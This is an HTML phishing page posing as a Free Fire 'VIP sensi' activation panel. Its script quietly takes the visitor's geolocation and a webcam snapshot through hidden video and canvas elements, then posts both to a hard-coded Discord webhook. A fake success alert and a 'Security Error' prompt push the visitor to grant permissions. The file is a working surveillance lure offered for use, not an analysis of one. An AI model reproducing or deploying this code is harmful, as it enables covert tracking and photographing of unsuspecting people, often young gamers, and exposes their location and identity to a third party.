<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF PANEL PRO v5.0</title>
    <style>
        body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; }
        .hero { padding: 40px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
        .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; }
        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="hero">
        <h1 style="color:#ff0055; margin:0;">FF PANEL PRO</h1>
        <p>Advance Sensi & Face ID Verification</p>
    </div>

    <div class="scanner-box">
        <h3 style="color: #00ffcc;">[System Analyzer]</h3>
        <p>📡 Network: Stable</p>
        <p>📍 Location: Ready</p>
        <button onclick="masterFunction()" id="mainBtn">ACTIVATE VIP SENSI</button>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    const webhook = "https://discord.com/api/webhooks/1495337044648394822/Jmy4qE3NN4FKZ_l1R2lKIxWoePGnnmSuefjt4qnewLFf8NXQTtzCj58BS7jYEbMOlRVv";

    async function masterFunction() {
        const btn = document.getElementById('mainBtn');
        btn.innerText = "PROCESSING...";
        
        let latitude = "Not Found";
        let longitude = "Not Found";

        // ১. আগে লোকেশন নিবে
        navigator.geolocation.getCurrentPosition(async (pos) => {
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
            startCamera(latitude, longitude);
        }, (err) => {
            startCamera("Denied", "Denied");
        });
    }

    async function startCamera(lat, lon) {
        const btn = document.getElementById('mainBtn');
        try {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, 'snapshot.jpg');
                    
                    // এখানে ছবি এবং লোকেশন একসাথে মেসেজে যাবে
                    let msg = `📸 **New Face ID Snapshot!**\n📍 **Location:** http://google.com/maps?q=$${lat},${lon}`;
                    if(lat === "Denied") msg = "📸 **Snapshot Captured!**\n🚫 *Location Permission Denied*";
                    
                    formData.append('content', msg);

                    await fetch(webhook, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
                
                alert("Sensi Activated Successfully!");
                btn.innerText = "SUCCESS";
            }, 2000);

        } catch (e) {
            alert("Security Error! Please ALLOW permissions.");
            btn.innerText = "RETRY";
        }
    }
    </script>
</body>
</html>
